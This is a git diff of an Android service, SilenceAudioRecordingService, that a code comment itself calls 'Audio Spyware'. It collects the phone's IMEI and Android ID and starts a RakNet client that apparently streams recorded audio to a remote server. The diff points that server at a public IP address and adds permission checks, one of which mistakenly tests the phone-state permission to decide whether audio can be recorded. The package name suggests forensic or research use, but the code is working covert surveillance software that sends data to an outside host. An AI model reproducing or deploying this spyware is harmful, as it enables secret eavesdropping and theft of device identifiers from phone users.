@@ -1,14 +1,16 @@
 package com.forensic.unipg.silenceaudiorecording;
 
+import android.Manifest;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.IBinder;
-import android.os.Process;
 import android.provider.Settings;
 import android.support.annotation.Nullable;
+import android.support.v4.content.ContextCompat;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -23,7 +25,7 @@ public class SilenceAudioRecordingService extends Service implements Runnable
     }
 
     //server values
-    private final String  mHost = "192.168.1.134";
+    private final String  mHost = "2.227.12.76";
     private final int     mPort = 8000;
     //thread values
     private Thread  mThread = null;
@@ -32,13 +34,21 @@ public class SilenceAudioRecordingService extends Service implements Runnable
     //get imei
     private String getIMEI()
     {
-        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
-        if(telephonyManager == null) return "";
-
-        String imei = telephonyManager.getDeviceId();
-        if(imei == null) return "";
-
-        return imei;
+        //Android M
+        //try to get
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)
+        {
+            TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+            if(telephonyManager == null) return "";
+            //I don't know IMEI
+            String imei  = telephonyManager.getDeviceId();
+            //bad case
+            if(imei == null) return "";
+            //ok
+            return imei;
+        }
+        //return
+        return "";
     }
 
     private String getAndroidID()
@@ -62,6 +72,16 @@ public class SilenceAudioRecordingService extends Service implements Runnable
         return activeNetworkInfo.isConnected();
     }
 
+    //Android M
+    boolean canRecordAudio()
+    {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
+        {
+            return false;
+        }
+        return true;
+    }
+
     @Override
     public void run()
     {
@@ -74,7 +94,10 @@ public class SilenceAudioRecordingService extends Service implements Runnable
                 //stop
                 RakClient.stop();
                 //re-try to restart
-                RakClient.start(mHost,mPort);
+                if(canRecordAudio())
+                {
+                    RakClient.start(mHost, mPort);
+                }
                 //sleep thread
                 try
                 {
@@ -105,7 +128,10 @@ public class SilenceAudioRecordingService extends Service implements Runnable
     {
         super.onCreate();
         // Start RakNet client Audio Spyware
-        RakClient.start(mHost,mPort);
+        if(canRecordAudio())
+        {
+            RakClient.start(mHost, mPort);
+        }
         RakClient.setIMEI(getIMEI());
         RakClient.setAndroidID(getAndroidID());
         // Enable loop
